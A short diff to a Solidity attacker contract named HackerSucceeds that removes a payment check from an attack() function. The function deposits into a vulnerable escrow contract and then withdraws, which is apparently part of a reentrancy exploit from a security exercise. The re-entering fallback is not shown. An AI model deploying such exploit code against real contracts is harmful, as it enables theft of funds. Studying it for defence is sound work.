@@ -11,7 +11,6 @@ contract HackerSucceeds {
     }
 
     function attack() external payable {
-        require(msg.value >= 1 ether);
         vulnerableEscrowContract.deposit{value: 1 ether}();
         vulnerableEscrowContract.withdraw();
     }
